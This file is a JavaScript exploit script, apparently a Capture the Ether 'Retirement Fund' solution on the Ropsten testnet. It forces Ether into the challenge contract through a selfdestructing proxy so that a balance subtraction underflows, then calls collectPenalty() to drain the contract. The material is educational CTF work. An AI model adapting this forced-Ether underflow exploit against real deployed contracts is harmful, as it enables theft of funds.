/**
 * INSTRUCTIONS
 *
 * 1. Deploy ProxyContract by running `truffle migrate --network ropsten`
 * 2. Copy ProxyContract address to variable below
 * 3. Copy challenge contract address (from capturetheether) to variable below
 * 4. All good, run it.
 *
 * SOLUTION
 *
 * Due to require(msg.sender == owner), where owner is the capturetheether factory contract,
 * we could never call withdraw().
 *
 * https://docs.soliditylang.org/en/v0.8.9/contracts.html
 *
 * "A contract without a receive Ether function can receive Ether as a recipient
 * of a coinbase transaction (aka miner block reward) or as a destination of a selfdestruct.
 *
 * A contract cannot react to such Ether transfers and thus also cannot reject them.
 * This is a design choice of the EVM and Solidity cannot work around it.
 *
 * It also means that address(this).balance can be higher than the sum of some manual accounting
 * implemented in a contract (i.e. having a counter updated in the receive Ether function)."
 *
 * So basically we want to "underflow" this operation "startBalance - address(this).balance"
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");

const mnemonic = fs.readFileSync("../.secret").toString().trim();
const infuraProjectId = fs.readFileSync("../.infura").toString().trim();

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: `https://ropsten.infura.io/v3/${infuraProjectId}`,
});

const web3 = new Web3(provider);

const proxyAbi = JSON.parse(
  fs.readFileSync("./3_retirement_fund_local/build/contracts/ProxyContract.json")
).abi;

const challengeAbi = JSON.parse(fs.readFileSync('./abi/3_retirement_fund.json'));

const challengeContractAddress = "0x3BFd500440a0dCFd05f664C02A0bD68cb2B2d712";
const proxyContractAddress = "0x938A60664bdedbd2a8505a8Cfe2a6A1abFaAC619";

const outputBalances = (userAccount) => {
  web3.eth.getBalance(userAccount, (_, balance) => {
    console.log("Account balance: " + Web3Utils.fromWei(balance, "ether"));
  });
  web3.eth.getBalance(challengeContractAddress, (_, balance) => {
    console.log(
      "ChallengeContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
  web3.eth.getBalance(proxyContractAddress, (_, balance) => {
    console.log(
      "ProxyContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
};

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const proxyContract = new web3.eth.Contract(proxyAbi, proxyContractAddress);
    const challengeContract = new web3.eth.Contract(
      challengeAbi,
      challengeContractAddress
    );
    const gasPrice = await web3.eth.getGasPrice();
    let res;

    outputBalances(accounts[0]);

    res = await proxyContract.methods
      .destroy(challengeContractAddress)
      .send({ from: accounts[0], gasPrice })

    console.log(res);

    outputBalances(accounts[0]);

    res = await challengeContract.methods
      .collectPenalty()
      .send({ from: accounts[0], gasPrice })

    console.log(res);

    outputBalances(accounts[0]);
  } catch (ex) {
    console.log(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
